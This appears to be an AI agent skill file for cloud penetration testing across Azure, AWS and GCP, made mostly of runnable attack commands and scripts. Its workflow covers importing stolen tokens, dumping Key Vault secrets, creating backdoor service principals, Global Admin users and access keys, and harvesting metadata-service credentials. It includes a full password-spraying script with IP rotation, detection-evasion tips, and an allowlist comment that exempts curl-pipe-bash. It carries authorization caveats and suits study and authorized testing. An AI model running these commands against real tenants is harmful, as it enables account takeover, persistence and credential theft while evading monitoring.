---
title: "Cloud Penetration Testing"
description: "This skill should be used when the user asks to 'perform cloud penetration testing', 'assess Azure or AWS or GCP security', 'enumerate cloud resources', 'exploit cloud misconfiguratio..."
category: "devops"
source: "community"
author: "Community"
tags: ["cloud", "penetration", "testing"]
date: 2026-03-20
---

<!-- security-allowlist: curl-pipe-bash -->

# Cloud Penetration Testing

## Purpose

Conduct comprehensive security assessments of cloud infrastructure across Microsoft Azure, Amazon Web Services (AWS), and Google Cloud Platform (GCP). This skill covers reconnaissance, authentication testing, resource enumeration, privilege escalation, data extraction, and persistence techniques for authorized cloud security engagements.

## Prerequisites

### Required Tools
```bash
# Azure tools
Install-Module -Name Az -AllowClobber -Force
Install-Module -Name MSOnline -Force
Install-Module -Name AzureAD -Force

# AWS CLI
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip && sudo ./aws/install

# GCP CLI
curl https://sdk.cloud.google.com | bash
gcloud init

# Additional tools
pip install scoutsuite pacu
```

### Required Knowledge
- Cloud architecture fundamentals
- Identity and Access Management (IAM)
- API authentication mechanisms
- DevOps and automation concepts

### Required Access
- Written authorization for testing
- Test credentials or access tokens
- Defined scope and rules of engagement

## Outputs and Deliverables

1. **Cloud Security Assessment Report** - Comprehensive findings and risk ratings
2. **Resource Inventory** - Enumerated services, storage, and compute instances
3. **Credential Findings** - Exposed secrets, keys, and misconfigurations
4. **Remediation Recommendations** - Hardening guidance per platform

## Core Workflow

### Phase 1: Reconnaissance

Gather initial information about target cloud presence:

```bash
# Azure: Get federation info
curl "https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&xml=1"

# Azure: Get Tenant ID
curl "https://login.microsoftonline.com/target.com/v2.0/.well-known/openid-configuration"

# Enumerate cloud resources by company name
python3 cloud_enum.py -k targetcompany

# Check IP against cloud providers
cat ips.txt | python3 ip2provider.py
```

### Phase 2: Azure Authentication

Authenticate to Azure environments:

```powershell
# Az PowerShell Module
Import-Module Az
Connect-AzAccount

# With credentials (may bypass MFA)
$credential = Get-Credential
Connect-AzAccount -Credential $credential

# Import stolen context
Import-AzContext -Profile 'C:\Temp\StolenToken.json'

# Export context for persistence
Save-AzContext -Path C:\Temp\AzureAccessToken.json

# MSOnline Module
Import-Module MSOnline
Connect-MsolService
```

### Phase 3: Azure Enumeration

Discover Azure resources and permissions:

```powershell
# List contexts and subscriptions
Get-AzContext -ListAvailable
Get-AzSubscription

# Current user role assignments
Get-AzRoleAssignment

# List resources
Get-AzResource
Get-AzResourceGroup

# Storage accounts
Get-AzStorageAccount

# Web applications
Get-AzWebApp

# SQL Servers and databases
Get-AzSQLServer
Get-AzSqlDatabase -ServerName $Server -ResourceGroupName $RG

# Virtual machines
Get-AzVM
$vm = Get-AzVM -Name "VMName"
$vm.OSProfile

# List all users
Get-MSolUser -All

# List all groups
Get-MSolGroup -All

# Global Admins
Get-MsolRole -RoleName "Company Administrator"
Get-MSolGroupMember -GroupObjectId $GUID

# Service Principals
Get-MsolServicePrincipal
```

### Phase 4: Azure Exploitation

Exploit Azure misconfigurations:

```powershell
# Search user attributes for passwords
$users = Get-MsolUser -All
foreach($user in $users){
    $props = @()
    $user | Get-Member | foreach-object{$props+=$_.Name}
    foreach($prop in $props){
        if($user.$prop -like "*password*"){
            Write-Output ("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop)
        }
    }
}

# Execute commands on VMs
Invoke-AzVMRunCommand -ResourceGroupName $RG -VMName $VM -CommandId RunPowerShellScript -ScriptPath ./script.ps1

# Extract VM UserData
$vms = Get-AzVM
$vms.UserData

# Dump Key Vault secrets
az keyvault list --query '[].name' --output tsv
az keyvault set-policy --name <vault> --upn <user> --secret-permissions get list
az keyvault secret list --vault-name <vault> --query '[].id' --output tsv
az keyvault secret show --id <URI>
```

### Phase 5: Azure Persistence

Establish persistence in Azure:

```powershell
# Create backdoor service principal
$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)

# Add service principal to Global Admin
$sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
$role = Get-MsolRole -RoleName "Company Administrator"
Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId

# Login as service principal
$cred = Get-Credential  # AppID as username, secret as password
Connect-AzAccount -Credential $cred -Tenant "tenant-id" -ServicePrincipal

# Create new admin user via CLI
az ad user create --display-name <name> --password <pass> --user-principal-name <upn>
```

### Phase 6: AWS Authentication

Authenticate to AWS environments:

```bash
# Configure AWS CLI
aws configure
# Enter: Access Key ID, Secret Access Key, Region, Output format

# Use specific profile
aws configure --profile target

# Test credentials
aws sts get-caller-identity
```

### Phase 7: AWS Enumeration

Discover AWS resources:

```bash
# Account information
aws sts get-caller-identity
aws iam list-users
aws iam list-roles

# S3 Buckets
aws s3 ls
aws s3 ls s3://bucket-name/
aws s3 sync s3://bucket-name ./local-dir

# EC2 Instances
aws ec2 describe-instances

# RDS Databases
aws rds describe-db-instances --region us-east-1

# Lambda Functions
aws lambda list-functions --region us-east-1
aws lambda get-function --function-name <name>

# EKS Clusters
aws eks list-clusters --region us-east-1

# Networking
aws ec2 describe-subnets
aws ec2 describe-security-groups --group-ids <sg-id>
aws directconnect describe-connections
```

### Phase 8: AWS Exploitation

Exploit AWS misconfigurations:

```bash
# Check for public RDS snapshots
aws rds describe-db-snapshots --snapshot-type manual --query=DBSnapshots[*].DBSnapshotIdentifier
aws rds describe-db-snapshot-attributes --db-snapshot-identifier <id>
# AttributeValues = "all" means publicly accessible

# Extract Lambda environment variables (may contain secrets)
aws lambda get-function --function-name <name> | jq '.Configuration.Environment'

# Access metadata service (from compromised EC2)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv2 access
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
```

### Phase 9: AWS Persistence

Establish persistence in AWS:

```bash
# List existing access keys
aws iam list-access-keys --user-name <username>

# Create backdoor access key
aws iam create-access-key --user-name <username>

# Get all EC2 public IPs
for region in $(cat regions.txt); do
    aws ec2 describe-instances --query=Reservations[].Instances[].PublicIpAddress --region $region | jq -r '.[]'
done
```

### Phase 10: GCP Enumeration

Discover GCP resources:

```bash
# Authentication
gcloud auth login
gcloud auth activate-service-account --key-file creds.json
gcloud auth list

# Account information
gcloud config list
gcloud organizations list
gcloud projects list

# IAM Policies
gcloud organizations get-iam-policy <org-id>
gcloud projects get-iam-policy <project-id>

# Enabled services
gcloud services list

# Source code repos
gcloud source repos list
gcloud source repos clone <repo>

# Compute instances
gcloud compute instances list
gcloud beta compute ssh --zone "region" "instance" --project "project"

# Storage buckets
gsutil ls
gsutil ls -r gs://bucket-name
gsutil cp gs://bucket/file ./local

# SQL instances
gcloud sql instances list
gcloud sql databases list --instance <id>

# Kubernetes
gcloud container clusters list
gcloud container clusters get-credentials <cluster> --region <region>
kubectl cluster-info
```

### Phase 11: GCP Exploitation

Exploit GCP misconfigurations:

```bash
# Get metadata service data
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google"

# Check access scopes
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H 'Metadata-Flavor:Google'

# Decrypt data with keyring
gcloud kms decrypt --ciphertext-file=encrypted.enc --plaintext-file=out.txt --key <key> --keyring <keyring> --location global

# Serverless function analysis
gcloud functions list
gcloud functions describe <name>
gcloud functions logs read <name> --limit 100

# Find stored credentials
sudo find /home -name "credentials.db"
sudo cp -r /home/user/.config/gcloud ~/.config
gcloud auth list
```

## Quick Reference

### Azure Key Commands

| Action | Command |
|--------|---------|
| Login | `Connect-AzAccount` |
| List subscriptions | `Get-AzSubscription` |
| List users | `Get-MsolUser -All` |
| List groups | `Get-MsolGroup -All` |
| Current roles | `Get-AzRoleAssignment` |
| List VMs | `Get-AzVM` |
| List storage | `Get-AzStorageAccount` |
| Key Vault secrets | `az keyvault secret list --vault-name <name>` |

### AWS Key Commands

| Action | Command |
|--------|---------|
| Configure | `aws configure` |
| Caller identity | `aws sts get-caller-identity` |
| List users | `aws iam list-users` |
| List S3 buckets | `aws s3 ls` |
| List EC2 | `aws ec2 describe-instances` |
| List Lambda | `aws lambda list-functions` |
| Metadata | `curl http://169.254.169.254/latest/meta-data/` |

### GCP Key Commands

| Action | Command |
|--------|---------|
| Login | `gcloud auth login` |
| List projects | `gcloud projects list` |
| List instances | `gcloud compute instances list` |
| List buckets | `gsutil ls` |
| List clusters | `gcloud container clusters list` |
| IAM policy | `gcloud projects get-iam-policy <project>` |
| Metadata | `curl -H "Metadata-Flavor: Google" http://metadata.google.internal/...` |

### Metadata Service URLs

| Provider | URL |
|----------|-----|
| AWS | `http://169.254.169.254/latest/meta-data/` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2018-02-01` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` |

### Useful Tools

| Tool | Purpose |
|------|---------|
| ScoutSuite | Multi-cloud security auditing |
| Pacu | AWS exploitation framework |
| AzureHound | Azure AD attack path mapping |
| ROADTools | Azure AD enumeration |
| WeirdAAL | AWS service enumeration |
| MicroBurst | Azure security assessment |
| PowerZure | Azure post-exploitation |

## Constraints and Limitations

### Legal Requirements
- Only test with explicit written authorization
- Respect scope boundaries between cloud accounts
- Do not access production customer data
- Document all testing activities

### Technical Limitations
- MFA may prevent credential-based attacks
- Conditional Access policies may restrict access
- CloudTrail/Activity Logs record all API calls
- Some resources require specific regional access

### Detection Considerations
- Cloud providers log all API activity
- Unusual access patterns trigger alerts
- Use slow, deliberate enumeration
- Consider GuardDuty, Security Center, Cloud Armor

## Examples

### Example 1: Azure Password Spray

**Scenario:** Test Azure AD password policy

```powershell
# Using MSOLSpray with FireProx for IP rotation
# First create FireProx endpoint
python fire.py --access_key <key> --secret_access_key <secret> --region us-east-1 --url https://login.microsoft.com --command create

# Spray passwords
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\users.txt -Password "Spring2024!" -URL https://<api-gateway>.execute-api.us-east-1.amazonaws.com/fireprox
```

### Example 2: AWS S3 Bucket Enumeration

**Scenario:** Find and access misconfigured S3 buckets

```bash
# List all buckets
aws s3 ls | awk '{print $3}' > buckets.txt

# Check each bucket for contents
while read bucket; do
    echo "Checking: $bucket"
    aws s3 ls s3://$bucket 2>/dev/null
done < buckets.txt

# Download interesting bucket
aws s3 sync s3://misconfigured-bucket ./loot/
```

### Example 3: GCP Service Account Compromise

**Scenario:** Pivot using compromised service account

```bash
# Authenticate with service account key
gcloud auth activate-service-account --key-file compromised-sa.json

# List accessible projects
gcloud projects list

# Enumerate compute instances
gcloud compute instances list --project target-project

# Check for SSH keys in metadata
gcloud compute project-info describe --project target-project | grep ssh

# SSH to instance
gcloud beta compute ssh instance-name --zone us-central1-a --project target-project
```

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Authentication failures | Verify credentials; check MFA; ensure correct tenant/project; try alternative auth methods |
| Permission denied | List current roles; try different resources; check resource policies; verify region |
| Metadata service blocked | Check IMDSv2 (AWS); verify instance role; check firewall for 169.254.169.254 |
| Rate limiting | Add delays; spread across regions; use multiple credentials; focus on high-value targets |

## References

- [Advanced Cloud Scripts](references/advanced-cloud-scripts.md) - Azure Automation runbooks, Function Apps enumeration, AWS data exfiltration, GCP advanced exploitation

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.

---

## Reference: Advanced Cloud Scripts

# Advanced Cloud Pentesting Scripts

Reference: [Cloud Pentesting Cheatsheet by Beau Bullock](https://github.com/dafthack/CloudPentestCheatsheets)

## Azure Automation Runbooks

### Export All Runbooks from All Subscriptions

```powershell
$subs = Get-AzSubscription
Foreach($s in $subs){
    $subscriptionid = $s.SubscriptionId
    mkdir .\$subscriptionid\
    Select-AzSubscription -Subscription $subscriptionid
    $runbooks = @()
    $autoaccounts = Get-AzAutomationAccount | Select-Object AutomationAccountName,ResourceGroupName
    foreach ($i in $autoaccounts){
        $runbooks += Get-AzAutomationRunbook -AutomationAccountName $i.AutomationAccountName -ResourceGroupName $i.ResourceGroupName | Select-Object AutomationAccountName,ResourceGroupName,Name
    }
    foreach($r in $runbooks){
        Export-AzAutomationRunbook -AutomationAccountName $r.AutomationAccountName -ResourceGroupName $r.ResourceGroupName -Name $r.Name -OutputFolder .\$subscriptionid\
    }
}
```

### Export All Automation Job Outputs

```powershell
$subs = Get-AzSubscription
$jobout = @()
Foreach($s in $subs){
    $subscriptionid = $s.SubscriptionId
    Select-AzSubscription -Subscription $subscriptionid
    $jobs = @()
    $autoaccounts = Get-AzAutomationAccount | Select-Object AutomationAccountName,ResourceGroupName
    foreach ($i in $autoaccounts){
        $jobs += Get-AzAutomationJob $i.AutomationAccountName -ResourceGroupName $i.ResourceGroupName | Select-Object AutomationAccountName,ResourceGroupName,JobId
    }
    foreach($r in $jobs){
        $jobout += Get-AzAutomationJobOutput -AutomationAccountName $r.AutomationAccountName -ResourceGroupName $r.ResourceGroupName -JobId $r.JobId
    }
}
$jobout | Out-File -Encoding ascii joboutputs.txt
```

## Azure Function Apps

### List All Function App Hostnames

```powershell
$functionapps = Get-AzFunctionApp
foreach($f in $functionapps){
    $f.EnabledHostname
}
```

### Extract Function App Information

```powershell
$subs = Get-AzSubscription
$allfunctioninfo = @()
Foreach($s in $subs){
    $subscriptionid = $s.SubscriptionId
    Select-AzSubscription -Subscription $subscriptionid
    $functionapps = Get-AzFunctionApp
    foreach($f in $functionapps){
        $allfunctioninfo += $f.config | Select-Object AcrUseManagedIdentityCred,AcrUserManagedIdentityId,AppCommandLine,ConnectionString,CorSupportCredentials,CustomActionParameter
        $allfunctioninfo += $f.SiteConfig | fl
        $allfunctioninfo += $f.ApplicationSettings | fl
        $allfunctioninfo += $f.IdentityUserAssignedIdentity.Keys | fl
    }
}
$allfunctioninfo
```

## Azure Device Code Login Flow

### Initiate Device Code Login

```powershell
$body = @{
    "client_id" = "1950a258-227b-4e31-a9cf-717495945fc2"
    "resource"  = "https://graph.microsoft.com"
}
$UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
$Headers = @{}
$Headers["User-Agent"] = $UserAgent
$authResponse = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Post `
    -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
    -Headers $Headers `
    -Body $body
$authResponse
```

Navigate to https://microsoft.com/devicelogin and enter the code.

### Retrieve Access Tokens

```powershell
$body = @{
    "client_id"  = "1950a258-227b-4e31-a9cf-717495945fc2"
    "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
    "code"       = $authResponse.device_code
}
$Tokens = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Post `
    -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" `
    -Headers $Headers `
    -Body $body
$Tokens
```

## Azure Managed Identity Token Retrieval

```powershell
# From Azure VM
Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -Method GET -Headers @{Metadata="true"} -UseBasicParsing

# Full instance metadata
$instance = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/instance?api-version=2018-02-01' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
$instance
```

## AWS Region Iteration Scripts

Create `regions.txt`:
```
us-east-1
us-east-2
us-west-1
us-west-2
ca-central-1
eu-west-1
eu-west-2
eu-west-3
eu-central-1
eu-north-1
ap-southeast-1
ap-southeast-2
ap-south-1
ap-northeast-1
ap-northeast-2
ap-northeast-3
sa-east-1
```

### List All EC2 Public IPs

```bash
while read r; do
    aws ec2 describe-instances --query=Reservations[].Instances[].PublicIpAddress --region $r | jq -r '.[]' >> ec2-public-ips.txt
done < regions.txt
sort -u ec2-public-ips.txt -o ec2-public-ips.txt
```

### List All ELB DNS Addresses

```bash
while read r; do
    aws elbv2 describe-load-balancers --query LoadBalancers[*].DNSName --region $r | jq -r '.[]' >> elb-public-dns.txt
    aws elb describe-load-balancers --query LoadBalancerDescriptions[*].DNSName --region $r | jq -r '.[]' >> elb-public-dns.txt
done < regions.txt
sort -u elb-public-dns.txt -o elb-public-dns.txt
```

### List All RDS DNS Addresses

```bash
while read r; do
    aws rds describe-db-instances --query=DBInstances[*].Endpoint.Address --region $r | jq -r '.[]' >> rds-public-dns.txt
done < regions.txt
sort -u rds-public-dns.txt -o rds-public-dns.txt
```

### Get CloudFormation Outputs

```bash
while read r; do
    aws cloudformation describe-stacks --query 'Stacks[*].[StackName, Description, Parameters, Outputs]' --region $r | jq -r '.[]' >> cloudformation-outputs.txt
done < regions.txt
```

## ScoutSuite jq Parsing Queries

### AWS Queries

```bash
# Find All Lambda Environment Variables
for d in */ ; do
    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.awslambda.regions[].functions[] | select (.env_variables != []) | .arn, .env_variables' >> lambda-all-environment-variables.txt
done

# Find World Listable S3 Buckets
for d in */ ; do
    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.account_id, .services.s3.findings."s3-bucket-AuthenticatedUsers-read".items[]' >> s3-buckets-world-listable.txt
done

# Find All EC2 User Data
for d in */ ; do
    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].vpcs[].instances[] | select (.user_data != null) | .arn, .user_data' >> ec2-instance-all-user-data.txt
done

# Find EC2 Security Groups That Whitelist AWS CIDRs
for d in */ ; do
    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.account_id' >> ec2-security-group-whitelists-aws-cidrs.txt
    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.findings."ec2-security-group-whitelists-aws".items' >> ec2-security-group-whitelists-aws-cidrs.txt
done

# Find All EC2 EBS Volumes Unencrypted
for d in */ ; do
    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].volumes[] | select(.Encrypted == false) | .arn' >> ec2-ebs-volume-not-encrypted.txt
done

# Find All EC2 EBS Snapshots Unencrypted
for d in */ ; do
    tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].snapshots[] | select(.encrypted == false) | .arn' >> ec2-ebs-snapshot-not-encrypted.txt
done
```

### Azure Queries

```bash
# List All Azure App Service Host Names
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -r '.services.appservice.subscriptions[].web_apps[].host_names[]'

# List All Azure SQL Servers
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -jr '.services.sqldatabase.subscriptions[].servers[] | .name,".database.windows.net","\n"'

# List All Azure Virtual Machine Hostnames
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -jr '.services.virtualmachines.subscriptions[].instances[] | .name,".",.location,".cloudapp.windows.net","\n"'

# List Storage Accounts
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -r '.services.storageaccounts.subscriptions[].storage_accounts[] | .name'

# List Disks Encrypted with Platform Managed Keys
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq '.services.virtualmachines.subscriptions[].disks[] | select(.encryption_type = "EncryptionAtRestWithPlatformKey") | .name' > disks-with-pmks.txt
```

## Password Spraying with Az PowerShell

```powershell
$userlist = Get-Content userlist.txt
$passlist = Get-Content passlist.txt
$linenumber = 0
$count = $userlist.count
foreach($line in $userlist){
    $user = $line
    $pass = ConvertTo-SecureString $passlist[$linenumber] -AsPlainText -Force
    $current = $linenumber + 1
    Write-Host -NoNewline ("`r[" + $current + "/" + $count + "]" + "Trying: " + $user + " and " + $passlist[$linenumber])
    $linenumber++
    $Cred = New-Object System.Management.Automation.PSCredential ($user, $pass)
    try {
        Connect-AzAccount -Credential $Cred -ErrorAction Stop -WarningAction SilentlyContinue
        Add-Content valid-creds.txt ($user + "|" + $passlist[$linenumber - 1])
        Write-Host -ForegroundColor green ("`nGot something here: $user and " + $passlist[$linenumber - 1])
    }
    catch {
        $Failure = $_.Exception
        if ($Failure -match "ID3242") { continue }
        else {
            Write-Host -ForegroundColor green ("`nGot something here: $user and " + $passlist[$linenumber - 1])
            Add-Content valid-creds.txt ($user + "|" + $passlist[$linenumber - 1])
            Add-Content valid-creds.txt $Failure.Message
            Write-Host -ForegroundColor red $Failure.Message
        }
    }
}
```

## Service Principal Attack Path

```bash
# Reset service principal credential
az ad sp credential reset --id <app_id>
az ad sp credential list --id <app_id>

# Login as service principal
az login --service-principal -u "app id" -p "password" --tenant <tenant ID> --allow-no-subscriptions

# Create new user in tenant
az ad user create --display-name <name> --password <password> --user-principal-name <upn>

# Add user to Global Admin via MS Graph
$Body="{'principalId':'User Object ID', 'roleDefinitionId': '62e90394-69f5-4237-9190-012177145e10', 'directoryScopeId': '/'}"
az rest --method POST --uri https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments --headers "Content-Type=application/json" --body $Body
```

## Additional Tools Reference

| Tool | URL | Purpose |
|------|-----|---------|
| MicroBurst | github.com/NetSPI/MicroBurst | Azure security assessment |
| PowerZure | github.com/hausec/PowerZure | Azure post-exploitation |
| ROADTools | github.com/dirkjanm/ROADtools | Azure AD enumeration |
| Stormspotter | github.com/Azure/Stormspotter | Azure attack path graphing |
| MSOLSpray | github.com/dafthack | O365 password spraying |
| AzureHound | github.com/BloodHoundAD/AzureHound | Azure AD attack paths |
| WeirdAAL | github.com/carnal0wnage/weirdAAL | AWS enumeration |
| Pacu | github.com/RhinoSecurityLabs/pacu | AWS exploitation |
| ScoutSuite | github.com/nccgroup/ScoutSuite | Multi-cloud auditing |
| cloud_enum | github.com/initstring/cloud_enum | Public resource discovery |
| GitLeaks | github.com/zricethezav/gitleaks | Secret scanning |
| TruffleHog | github.com/dxa4481/truffleHog | Git secret scanning |
| ip2Provider | github.com/oldrho/ip2provider | Cloud IP identification |
| FireProx | github.com/ustayready/fireprox | IP rotation via AWS API Gateway |

## Vulnerable Training Environments

| Platform | URL | Purpose |
|----------|-----|---------|
| CloudGoat | github.com/RhinoSecurityLabs/cloudgoat | AWS vulnerable lab |
| SadCloud | github.com/nccgroup/sadcloud | Terraform misconfigs |
| Flaws Cloud | flaws.cloud | AWS CTF challenges |
| Thunder CTF | thunder-ctf.cloud | GCP CTF challenges |
